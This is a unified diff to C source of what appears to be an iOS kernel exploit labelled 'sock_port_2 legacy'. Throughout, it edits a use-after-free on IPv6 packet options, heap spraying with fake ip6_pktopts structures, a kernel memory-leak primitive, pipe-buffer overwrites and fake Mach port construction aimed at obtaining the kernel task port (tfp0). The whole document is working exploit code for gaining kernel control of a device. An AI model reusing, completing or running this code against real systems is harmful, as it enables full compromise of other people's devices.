@@ -191,9 +191,6 @@ retry:
 // second primitive: read 20 bytes from addr
 static int leak20AndFree(addr_t addr, bool do_kfree, void** retval)
 {
-    int offset = 0;
-    offset = 116;
-    
     int sockets[128];
     for (int i = 0; i < 128; i++)
     {
@@ -213,14 +210,15 @@ static int leak20AndFree(addr_t addr, bool do_kfree, void** retval)
     {
         addr += sizeof(addr_t);
     }
-    
-    *(uint32_t*)((addr_t)fakeOptions + offset) = 0xcafebabe; // magic
+
     *(addr_t*)((addr_t)fakeOptions + (sizeof(addr_t)*2)) = addr; // magic
-    // fakeOptions->ip6po_pktinfo = (struct in6_pktinfo*)addr;
+    *(addr_t*)((addr_t)fakeOptions + 12) = addr; // magic
+    *(addr_t*)((addr_t)fakeOptions + 120) = 0xcafebabe; // magic
+    fakeOptions->ip6po_pktinfo = (struct in6_pktinfo*)addr;
     
     for(int i = 0; i < MAX_UAF_RETRY; i++)
     {
-        spray_OSSerialize((void*)fakeOptions, sizeof(struct ip6_pktopts));
+        spray_OSUnserializeXML((void*)fakeOptions, sizeof(struct ip6_pktopts));
         
         for(int j = 0; j < 128; j++)
         {
@@ -439,7 +437,7 @@ goto fail;\
 
     LOG_("exploiting sock_port_2 legacy");
 
-    int port_pointer_overwrite_pipe[2];
+    int overwrite_pipe[2];
     int fake_port_pipe[2] = {-1, -1};
 
     // get its kernel address
@@ -507,10 +505,10 @@ DEVLOG("%s: " ADDR, #val, val); \
     CHECK_EARLY_READ(ipc_space_kernel);
 
     DEVLOG("creating pipe");
-    err = pipe(port_pointer_overwrite_pipe);
+    err = pipe(overwrite_pipe);
     if(err)
     {
-        ERR("failed to create port_pointer_overwrite_pipe");
+        ERR("failed to create overwrite_pipe");
         goto fail;
     }
 
@@ -520,9 +518,9 @@ DEVLOG("%s: " ADDR, #val, val); \
     memset(pipebuf, 0, pipebuf_size);
     *(addr_t*)(pipebuf) = pipebuf_sizep;
 
-    write(port_pointer_overwrite_pipe[1], pipebuf, pipebuf_size);
-    read(port_pointer_overwrite_pipe[0], pipebuf, pipebuf_size);
-    write(port_pointer_overwrite_pipe[1], pipebuf, sizeof(addr_t));
+    write(overwrite_pipe[1], pipebuf, pipebuf_size);
+    read(overwrite_pipe[0], pipebuf, pipebuf_size);
+    write(overwrite_pipe[1], pipebuf, sizeof(addr_t));
 
     /* There are no PAN devices on aarch64 & ios 9 */
     /* but we have still 32bit */
@@ -599,7 +597,7 @@ DEVLOG("%s: " ADDR, #val, val); \
     earlyReadPtr(fds + koffset(FILEDESC_FD_OFILES), &ofiles);
     CHECK_EARLY_READ(ofiles);
 
-    earlyReadPtr(ofiles + port_pointer_overwrite_pipe[0] * sizeof(addr_t), &fproc);
+    earlyReadPtr(ofiles + overwrite_pipe[0] * sizeof(addr_t), &fproc);
     CHECK_EARLY_READ(fproc);
 
     earlyReadPtr(fproc + koffset(FILEPROC_F_FGLOB), &fglob);
@@ -666,13 +664,13 @@ DEVLOG("%s: " ADDR, #val, val); \
             goto fail;
         }
 
-        read(port_pointer_overwrite_pipe[0], &leak, sizeof(addr_t));
+        read(overwrite_pipe[0], &leak, sizeof(addr_t));
         if (leak == tfp0_port_addr)
         {
             DEVLOG("found leak (%d)", i);
             break;
         }
-        write(port_pointer_overwrite_pipe[1], &leak, sizeof(addr_t));
+        write(overwrite_pipe[1], &leak, sizeof(addr_t));
         mach_port_destroy(mach_task_self(), holder);
         holder = MACH_PORT_NULL;
     }
@@ -690,7 +688,7 @@ DEVLOG("%s: " ADDR, #val, val); \
         goto fail;
     }
 
-    write(port_pointer_overwrite_pipe[1], &fake_port_buffer, sizeof(addr_t));
+    write(overwrite_pipe[1], &fake_port_buffer, sizeof(addr_t));
 
     struct ool_msg *msg = malloc(0x1000);
     err = mach_msg(&msg->hdr, MACH_RCV_MSG, 0, 0x1000, holder, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
@@ -845,8 +843,8 @@ DEVLOG("%s: " ADDR, #val, val); \
     err = find_port_tfp0_sp(new_port, self_port_addr, true, NULL);
     CHECK_KERN_RET(find_port_tfp0_sp, NULL, err);
 
-    if (port_pointer_overwrite_pipe[0] > 0)  close(port_pointer_overwrite_pipe[0]);
-    if (port_pointer_overwrite_pipe[1] > 0)  close(port_pointer_overwrite_pipe[1]);
+    if (overwrite_pipe[0] > 0)  close(overwrite_pipe[0]);
+    if (overwrite_pipe[1] > 0)  close(overwrite_pipe[1]);
     if (fake_port_pipe[0] > 0)  close(fake_port_pipe[0]);
     if (fake_port_pipe[1] > 0)  close(fake_port_pipe[1]);
     if (fake_port) free((void *)fake_port);
@@ -908,8 +906,8 @@ DEVLOG("%s: " ADDR, #val, val); \
 
 fail:
     ERR("exploit failed, cleaning up");
-    if (port_pointer_overwrite_pipe[0] > 0)  close(port_pointer_overwrite_pipe[0]);
-    if (port_pointer_overwrite_pipe[1] > 0)  close(port_pointer_overwrite_pipe[1]);
+    if (overwrite_pipe[0] > 0)  close(overwrite_pipe[0]);
+    if (overwrite_pipe[1] > 0)  close(overwrite_pipe[1]);
     if (fake_port_pipe[0] > 0)  close(fake_port_pipe[0]);
     if (fake_port_pipe[1] > 0)  close(fake_port_pipe[1]);
     if (fake_port) free((void *)fake_port);
